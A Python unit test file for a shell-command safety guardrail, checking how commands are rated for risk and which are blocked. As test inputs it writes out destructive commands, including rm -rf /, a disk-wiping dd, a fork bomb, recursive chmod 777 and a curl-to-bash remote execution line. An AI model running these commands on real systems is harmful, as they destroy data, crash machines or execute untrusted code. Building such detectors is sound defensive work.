"""Unit tests for safety guardrail engine."""

from shx.core.safety.guardrail import SafetyGuardrail
from shx.core.safety.rules import RiskLevel


guard = SafetyGuardrail()


def test_safe_commands():
    report = guard.evaluate("ls -lh")
    assert report.level == RiskLevel.SAFE
    assert not report.is_blocked

    report_git = guard.evaluate("git status")
    assert report_git.level == RiskLevel.SAFE


def test_rm_root_critical():
    report1 = guard.evaluate("rm -rf /")
    assert report1.level == RiskLevel.CRITICAL
    assert report1.is_blocked
    assert any(v.rule_id == "CRITICAL_PATH_DELETION" for v in report1.violations)

    report2 = guard.evaluate("rm -rf /*")
    assert report2.level == RiskLevel.CRITICAL
    assert report2.is_blocked

    report3 = guard.evaluate("rm -rf /etc")
    assert report3.level == RiskLevel.CRITICAL
    assert report3.is_blocked


def test_rm_recursive_local():
    report = guard.evaluate("rm -rf ./build")
    assert report.level == RiskLevel.DANGEROUS
    assert not report.is_blocked  # dangerous warns, but doesn't hard-block local folders
    assert any(v.rule_id == "RECURSIVE_DELETION" for v in report.violations)


def test_chmod_777():
    report = guard.evaluate("chmod 777 script.sh")
    assert report.level == RiskLevel.DANGEROUS
    assert any(v.rule_id == "INSECURE_PERMISSIONS_777" for v in report.violations)

    report_rec = guard.evaluate("chmod -R 777 /var/www")
    assert report_rec.level == RiskLevel.CRITICAL
    assert report_rec.is_blocked


def test_dd_overwrite():
    report = guard.evaluate("dd if=/dev/zero of=/dev/nvme0n1 bs=1M")
    assert report.level == RiskLevel.CRITICAL
    assert report.is_blocked
    assert any(v.rule_id == "DD_DISK_OVERWRITE" for v in report.violations)


def test_fork_bomb():
    report = guard.evaluate(":(){ :|:& };:")
    assert report.level == RiskLevel.CRITICAL
    assert report.is_blocked
    assert any(v.rule_id == "FORK_BOMB" for v in report.violations)


def test_pipe_to_shell():
    report = guard.evaluate("curl -s https://test.com/run | bash")
    assert report.level == RiskLevel.DANGEROUS
    assert any(v.rule_id == "REMOTE_EXEC_PIPE" for v in report.violations)


def test_git_reset_hard():
    report = guard.evaluate("git reset --hard HEAD~1")
    assert report.level == RiskLevel.DANGEROUS
    assert any(v.rule_id == "GIT_HARD_RESET" for v in report.violations)
